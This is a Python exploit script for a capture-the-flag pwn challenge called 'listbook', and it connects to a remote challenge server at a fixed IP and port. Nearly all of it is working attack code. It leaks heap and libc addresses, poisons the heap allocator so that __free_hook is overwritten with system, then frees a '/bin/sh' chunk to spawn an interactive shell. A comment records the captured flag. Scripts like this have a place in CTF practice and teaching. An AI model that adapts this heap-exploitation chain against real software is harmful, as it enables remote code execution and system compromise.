#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './listbook'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'111.186.58.249', 'port':20001})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    lb = ListBook(conn)

    lb.add('a'*16, 'A')   # 0
    lb.add('a'*16, 'B')

    addr_heap_base = u(lb.show(0)[0][0][0x10:]) - 0x2a0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    lb.delete(0)
    lb.add('\x80\n', 'C')

    for i in range(9):
        lb.add('\x01\n', '1')
    lb.delete(1)

    lb.add('\x02\n', '2')

    addr_libc_mainarena = u(lb.show(0)[0][1]) - 0x260
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    lb.delete(0)

    exploit  = p64(0xdeadbeef)
    exploit += p64(addr_heap_base + 0x510)

    exploit += p64(addr_heap_base + 0x500)
    exploit += p64(addr_heap_base + 0x520)

    exploit += p64(addr_heap_base + 0x510)
    exploit += p64(addr_libc_mainarena+ 0x260)
    lb.add('\x03\n', exploit)

    for i in range(6):
        lb.add('\x04\n', '4')
    lb.add('\x05\n', b'0'*0x20 + p64(addr_libc_free_hook))

    lb.add('\x06\n', '/bin/sh')
    lb.add('exploit\n', p64(addr_libc_system))

    lb.delete(6)

def get_hash(s):
    h = 0
    for c in s:
        h += ord(c)
    return h%16

class ListBook:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def add(self, name, content):
        self.sendlineafter('>>', '1')
        self.sendafter('name>', name)
        self.sendlineafter('content>', content)

    def delete(self, idx):
        self.sendlineafter('>>', '2')
        self.sendlineafter('index>', str(idx))

    def show(self, idx):
        self.sendlineafter('>>', '3')
        self.sendlineafter('index>', str(idx))
        l = self.recvuntil(b'\n1.add').split(b'\n')[:-1]
        return list(map(lambda x: x.split(b' => '), l))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{B4by_D0o0B13_F73e_1s_Re41ly_Ea5y}

if __name__=='__main__':
    main()

#==========
